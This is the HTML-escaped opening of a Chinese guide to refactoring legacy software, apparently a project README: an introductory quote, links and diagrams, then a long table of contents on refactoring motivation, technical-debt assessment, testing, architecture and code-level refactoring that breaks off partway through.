&lt;p&gt;软件开发总成本 = 开发成本 + 维护成本；软件维护成本 = 理解成本 + 修改成本 + 测试成本 + 部署成本。—— Ken Beck&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最新版本内容，请访问：&lt;a href="https://migration.ink/" rel="nofollow"&gt;https://migration.ink/&lt;/a&gt;，或者 &lt;a href="https://github.com/phodal/migration"&gt;https://github.com/phodal/migration&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;模型与原则：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/to-ddd.png"&gt;&lt;img src="images/to-ddd.png" alt="To DDD" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;流程：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/refactoring-process.png"&gt;&lt;img src="images/refactoring-process.png" alt="重构流程" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;索引：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/toc.jpg"&gt;&lt;img src="images/toc.jpg" alt="Index" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目录：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E5%86%8D%E8%AF%B4%E9%81%97%E7%95%99%E7%B3%BB%E7%BB%9F%E9%87%8D%E6%9E%84"&gt;再说遗留系统重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%87%8D%E6%9E%84%EF%BC%9F"&gt;为什么重构？&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E7%9A%84%E5%8A%A8%E6%9C%BA"&gt;重构的动机&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E4%B8%8D%E4%B8%80%E5%AE%9A%E8%83%BD%E5%B8%A6%E6%9D%A5%E4%BB%80%E4%B9%88%EF%BC%9F"&gt;重构不一定能带来什么？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E6%98%AF%E4%B8%80%E7%A7%8D%E6%96%87%E5%8C%96"&gt;重构是一种文化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%A4%A7%E8%A7%84%E6%A8%A1%E9%87%8D%E6%9E%84%E7%9A%84%E6%97%B6%E6%9C%BA"&gt;大规模重构的时机&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%AF%B4%E6%B8%85%E9%87%8D%E6%9E%84%E7%9A%84%E4%BB%B7%E5%80%BC"&gt;说清重构的价值&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%B3%BB%E7%BB%9F%E9%87%8D%E6%9E%84%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%8E%9F%E5%88%99"&gt;系统重构模式与原则&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E6%A8%A1%E5%BC%8F%EF%BC%9Aipdca"&gt;重构模式：IPDCA&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%9B%9B%E7%BA%A7%E9%87%8D%E6%9E%84"&gt;四级重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%B0%8F%E6%AD%A5%E5%89%8D%E8%BF%9B"&gt;小步前进&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#git--%E5%B7%A5%E4%BD%9C%E6%B5%81"&gt;Git 工作流&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#master-%E6%9C%BA%E5%88%B6"&gt;Master 机制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#pr-%E6%9C%BA%E5%88%B6"&gt;PR 机制&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%BB%BA%E7%AB%8B%E8%BF%9C%E6%99%AF%E4%B8%8E%E6%96%B9%E5%90%91"&gt;建立远景与方向&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%8B%89%E9%80%9A%EF%BC%9A%E5%AF%B9%E9%BD%90%E7%9B%AE%E6%A0%87"&gt;拉通：对齐目标&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%98%8E%E7%A1%AE%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9"&gt;明确潜在风险&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BA%BA%E8%AF%84%E4%BC%B0"&gt;人评估&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E8%8C%83%E5%9B%B4"&gt;重构范围&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BA%A7%E5%87%BA%E7%89%A9"&gt;产出物&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#kpi-%E5%BA%A6%E9%87%8F"&gt;KPI 度量&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E5%BB%BA%E8%A7%84%E8%8C%83"&gt;重建规范&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%9B%A2%E9%98%9F%E8%B5%8B%E8%83%BD"&gt;团队赋能&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%8E%9F%E5%88%99%E4%B8%8E%E6%A8%A1%E5%BC%8F"&gt;原则与模式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E8%AF%84%E4%BC%B0%E4%B8%8E%E5%BA%A6%E9%87%8F"&gt;重构评估与度量&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF%E5%80%BA%E5%8A%A1"&gt;识别技术债务&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%8A%80%E6%9C%AF%E5%80%BA%E9%A3%8E%E6%9A%B4"&gt;技术债风暴&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%9E%B6%E6%9E%84%E8%AF%84%E4%BC%B0%EF%BC%9A%E6%8A%80%E6%9C%AF%E9%A9%B1%E5%8A%A8-vs-%E4%B8%9A%E5%8A%A1%E9%A9%B1%E5%8A%A8"&gt;架构评估：技术驱动 vs 业务驱动&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BB%A3%E7%A0%81%E8%AF%84%E4%BC%B0%EF%BC%9A%E6%94%B6%E9%9B%86-bad-smell"&gt;代码评估：收集 bad smell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%94%B6%E9%9B%86-todo"&gt;收集 Todo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%B5%8B%E8%AF%95%E5%92%8C%E6%96%87%E6%A1%A3%E8%AF%84%E4%BC%B0"&gt;测试和文档评估&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%A1%B9%E7%9B%AE%E8%AF%84%E4%BC%B0"&gt;项目评估&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%BC%96%E5%86%99%E5%B7%A5%E5%85%B7%E8%AF%84%E4%BC%B0"&gt;编写工具评估&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BB%A3%E7%A0%81%E8%AF%84%E4%BC%B0%E5%B7%A5%E5%85%B7"&gt;代码评估工具&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%9C%9F%E5%AE%9E%E7%9A%84%E6%B5%8B%E8%AF%95%E8%A6%86%E7%9B%96%E7%8E%87"&gt;真实的测试覆盖率&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%8F%AF%E6%B5%8B%E8%AF%95%E6%80%A7%E8%AF%84%E4%BC%B0"&gt;可测试性评估&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%BA%A6%E9%87%8F"&gt;度量&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%AF%BB%E6%89%BE%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%A3%AB"&gt;寻找专业人士&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E5%87%86%E5%85%A5%E6%9D%A1%E4%BB%B6"&gt;重构准入条件&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"&gt;工具准备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E7%9C%8B%E6%9D%BF"&gt;重构看板&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6"&gt;版本控制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E9%87%8D%E6%9E%84%E5%B7%A5%E5%85%B7"&gt;自动化重构工具&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E7%8E%AF%E5%A2%83"&gt;持续集成环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%AE%B0%E5%BD%95"&gt;记录&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%8E%A2%E7%B4%A2%E6%80%A7%E9%87%8D%E6%9E%84%EF%BC%9A%E5%8F%AF%E8%A1%8C%E6%96%B9%E6%A1%88"&gt;探索性重构：可行方案&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E5%87%86%E5%A4%87%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%9D%8F%E5%91%B3%E9%81%93%E7%9A%84%E6%A8%A1%E5%BC%8F"&gt;准备知识：坏味道的模式&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#c4-%E6%A8%A1%E5%9E%8B"&gt;C4 模型&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%8E%A2%E7%B4%A2%E6%A8%A1%E5%BC%8F"&gt;探索模式&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#1-%E4%BB%8E%E5%88%86%E5%B1%82%E6%9E%B6%E6%9E%84%E5%88%B0%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81"&gt;1. 从分层架构到具体代码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#2-%E4%BB%8E%E5%A4%96%E9%83%A8%E9%80%82%E9%85%8D%E5%99%A8%E5%88%B0%E5%86%85%E9%83%A8%E9%80%82%E9%85%8D%E5%99%A8"&gt;2. 从外部适配器到内部适配器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#3-%E6%9F%A5%E7%9C%8B%E6%B5%8B%E8%AF%95%E6%83%85%E5%86%B5"&gt;3. 查看测试情况&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#4-%E9%92%88%E5%AF%B9%E4%BA%8E%E6%9C%80%E5%A4%8D%E6%9D%82%E7%9A%84%E6%83%85%E5%BD%A2%E5%92%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%83%85%E5%BD%A2"&gt;4. 针对于最复杂的情形和最简单的情形&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%B7%A5%E5%85%B7%EF%BC%9Aapi-%E5%88%97%E8%A1%A8%E5%92%8C%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB"&gt;工具：API 列表和调用关系&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%9E%84%E5%BB%BA%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86"&gt;构建领域知识&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E4%BA%86%E8%A7%A3%E4%B8%9A%E5%8A%A1%E6%9E%B6%E6%9E%84"&gt;了解业务架构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%9E%B6%E6%9E%84%E5%85%A8%E6%99%AF"&gt;架构全景&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%A2%86%E5%9F%9F%E5%90%8D%E8%AF%8D%E8%A1%A8"&gt;领域名词表&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%AF%BB%E6%89%BE%E9%AB%98%E5%BC%95%E7%94%A8--%E9%AB%98%E4%BF%AE%E6%94%B9"&gt;寻找高引用 + 高修改&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E9%98%B2%E6%8A%A4%E7%BD%91"&gt;第一步：防护网&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E9%98%B2%E6%8A%A4%E7%BD%91%E7%AD%96%E7%95%A5"&gt;防护网策略&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95"&gt;第一个测试&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E9%87%8D%E6%9E%84"&gt;持续集成重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%A3%80%E8%A7%86%E6%B5%8B%E8%AF%95"&gt;检视测试&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E9%87%8D%E6%9E%84"&gt;系统架构重构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E9%AB%98%E8%B4%A8%E9%87%8F%E7%BA%A7-ddd-%E9%87%8D%E6%9E%84%EF%BC%9A%E6%BC%94%E8%BF%9B%E9%A9%B1%E5%8A%A8%E7%9A%84%E4%BA%8B%E4%BB%B6%E9%A3%8E%E6%9A%B4"&gt;高质量级 DDD 重构：演进驱动的事件风暴&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%BD%BB%E9%87%8F%E7%BA%A7-ddd-%E9%87%8D%E6%9E%84%EF%BC%9A%E7%8E%B0%E7%8A%B6%E9%A9%B1%E5%8A%A8%E7%9A%84%E9%A2%86%E5%9F%9F%E6%96%B9%E6%A1%88"&gt;轻量级 DDD 重构：现状驱动的领域方案&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E8%A6%81%E7%B4%A0"&gt;限界上下文要素&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%87%8D%E6%9E%84"&gt;微服务重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E2%80%A6%E2%80%A6"&gt;……&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E9%87%8D%E6%9E%84"&gt;服务架构重构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%95%B4%E6%B4%81%E6%9E%B6%E6%9E%84"&gt;整洁架构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%AE%BE%E8%AE%A1%E6%96%B0%E6%9E%B6%E6%9E%84"&gt;设计新架构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%AE%9E%E6%96%BD%E6%96%B0%E5%88%86%E5%B1%82%E6%9E%B6%E6%9E%84"&gt;实施新分层架构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E5%88%92%E5%88%86%E7%B1%BB%EF%BC%8C%E7%A7%BB%E5%8A%A8%E4%BB%A3%E7%A0%81"&gt;划分类，移动代码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%8A%80%E6%9C%AF%E6%A8%A1%E5%9D%97%E5%8C%96--%E9%87%8D%E6%90%AD"&gt;技术模块化 =&amp;gt; 重搭&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%B8%AD%E9%97%B4%E6%80%81%E5%88%86%E5%B1%82"&gt;中间态分层&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%AA%8C%E6%94%B6%E6%9D%A1%E4%BB%B6%EF%BC%9A%E6%9E%84%E5%BB%BA"&gt;验收条件：构建&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%BD%9C%E5%9C%A8%E9%97%AE%E9%A2%98"&gt;潜在问题&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#bean-%E6%B3%A8%E5%85%A5"&gt;bean 注入&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%A7%A3%E5%86%B3%E5%86%B2%E7%AA%81"&gt;解决冲突&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%90%8C%E6%AD%A5-api-%E4%BF%AE%E6%94%B9"&gt;同步 API 修改&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%AF%B9%E9%BD%90%E6%96%B0%E5%88%86%E5%B1%82%E6%9E%B6%E6%9E%84"&gt;对齐新分层架构&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%85%AC%E5%85%B1%E4%BB%A3%E7%A0%81%E9%87%8D%E6%9E%84"&gt;公共代码重构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E5%AE%83%E7%9C%9F%E6%98%AF%E4%B8%AA-util-%E5%90%97%EF%BC%9F"&gt;它真是个 util 吗？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%BF%87%E5%BA%A6%E8%AE%BE%E8%AE%A1"&gt;过度设计&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%96%B0%E5%AE%9A%E4%B9%89%EF%BC%9A%E6%B6%88%E9%99%A4%E4%BA%8C%E4%B9%89%E6%80%A7"&gt;重新定义：消除二义性&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%B1%BB%E8%BF%9B%E8%A1%8C%E5%86%85%E8%81%9A"&gt;类进行内聚&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%88%92%E5%88%86%E6%8A%80%E6%9C%AF%E9%83%A8%E5%88%86"&gt;划分技术部分&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%88%92%E5%88%86%E4%B8%9A%E5%8A%A1%E9%83%A8%E5%88%86"&gt;划分业务部分&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E8%81%8C%E8%B4%A3%E5%B0%91--%E5%B9%B3%E7%BA%A7"&gt;职责少 =&amp;gt; 平级&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%A4%9A--%E5%86%8D%E6%8C%89%E4%B8%9A%E5%8A%A1%E6%8B%86%E5%88%86"&gt;业务代码多 =&amp;gt; 再按业务拆分&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%A8%A1%E5%9D%97%E9%87%8D%E6%9E%84"&gt;模块重构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E7%BB%84%E4%BB%B6%E8%81%9A%E5%90%88%E4%B8%89%E5%8E%9F%E5%88%99"&gt;组件聚合三原则&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%89%93%E7%A0%B4%E5%8C%85%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB"&gt;打破包之间的依赖关系&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE"&gt;依赖倒置&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%9B%B4%E5%A5%BD%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"&gt;更好的面向对象&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%B8%85%E7%90%86%E5%9E%83%E5%9C%BE%E4%BB%A3%E7%A0%81"&gt;清理垃圾代码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%A8%A1%E5%9E%8B%E9%87%8D%E6%9E%84"&gt;模型重构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E8%81%9A%E5%90%88%E8%A1%8C%E4%B8%BA"&gt;聚合行为&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E7%94%B1%E5%86%85%E5%88%B0%E5%A4%96%E5%89%A5%E7%A6%BB%EF%BC%8C%E7%94%B1%E5%A4%96%E5%88%B0%E5%86%85%E8%81%9A%E5%90%88"&gt;由内到外剥离，由外到内聚合&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%AF%86%E5%88%AB%E6%A8%A1%E5%BC%8F-1%EF%BC%9A%E8%BE%93%E5%85%A5%E5%8F%82%E6%95%B0"&gt;识别模式 1：输入参数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%AF%86%E5%88%AB%E6%A8%A1%E5%BC%8F-2%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%8F%82%E6%95%B0"&gt;识别模式 2：返回参数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BC%98%E5%8C%96%E5%88%9B%E5%BB%BA"&gt;优化创建&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E5%91%BD%E5%90%8D%EF%BC%9A%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80"&gt;重命名：统一语言&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E7%B1%BB"&gt;类&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%8A%B6%E6%80%81"&gt;状态&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%96%B9%E6%B3%95"&gt;方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%AE%B9%E5%99%A8"&gt;容器&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%A6%BB%E5%BF%83%E5%88%86%E7%A6%BB%E6%A8%A1%E5%9E%8B%EF%BC%9A%E6%B6%88%E9%99%A4%E4%BA%8C%E4%B9%89%E6%80%A7"&gt;离心分离模型：消除二义性&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%8F%90%E5%8F%96%E5%8F%82%E6%95%B0%E5%AF%B9%E8%B1%A1"&gt;提取参数对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%E9%80%BB%E8%BE%91"&gt;处理过程逻辑&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%A2%86%E5%9F%9F%E7%89%B9%E5%AE%9A%E8%AF%AD%E8%A8%80"&gt;领域特定语言&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%A8%A1%E5%BC%8F%E9%87%8D%E6%9E%84"&gt;模式重构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E7%BB%88%E6%AD%A2-singleton"&gt;终止 Singleton&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%B7%A5%E5%8E%82%E5%B0%81%E8%A3%85%E5%A4%8D%E6%9D%82%E6%9E%84%E5%BB%BA"&gt;工厂封装复杂构建&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E6%89%8B%E6%B3%95"&gt;重构手法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F%E6%8F%90%E4%BE%9B%E6%98%93%E5%8F%98%E8%A7%84%E5%88%99"&gt;策略模式提供易变规则&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F%E6%8B%86%E8%A7%A3%E5%A4%8D%E6%9D%82%E5%AF%B9%E8%B1%A1"&gt;建造者模式拆解复杂对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%B7%A5%E5%85%B7%EF%BC%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB"&gt;工具：自动化识别&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BB%A3%E7%A0%81%E9%87%8D%E6%9E%84"&gt;代码重构&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E9%99%8D%E4%BD%8E%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6"&gt;降低圈复杂度&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%89%8B%E6%B3%95%EF%BC%9A%E6%8F%90%E5%8F%96"&gt;手法：提取&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%89%8B%E6%B3%95%EF%BC%9A%E5%86%85%E8%81%94"&gt;手法：内联&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%89%8B%E6%B3%95%EF%BC%9A%E7%A7%BB%E5%8A%A8"&gt;手法：移动&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%96%B9%E6%B3%95%E7%A7%BB%E8%87%B3%E5%85%B6%E5%AE%83%E7%B1%BB%E4%B8%AD"&gt;方法移至其它类中&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%A0%87%E5%87%86%EF%BC%9A4-%E8%A1%8C%E7%9A%84%E6%96%B9%E6%B3%95"&gt;标准：4 行的方法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E7%A4%BA%E4%BE%8B"&gt;重构示例&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E8%AF%84%E4%BC%B0"&gt;评估&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#c4-%E6%A8%A1%E5%9E%8B%E5%B1%95%E5%BC%80"&gt;C4 模型展开&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%B7%A5%E5%85%B7%E8%AF%84%E4%BC%B0"&gt;工具评估&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E4%BB%A3%E7%A0%81%E7%BB%9F%E8%AE%A1"&gt;代码统计&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5%E8%AF%84%E4%BC%B0"&gt;基本情况评估&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BB%A3%E7%A0%81%E5%9D%8F%E5%91%B3%E9%81%93%E8%AF%84%E4%BC%B0"&gt;代码坏味道评估&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%9E%B6%E6%9E%84%E8%AF%84%E4%BC%B0"&gt;架构评估&lt;/a&gt;&lt;/li&gt;
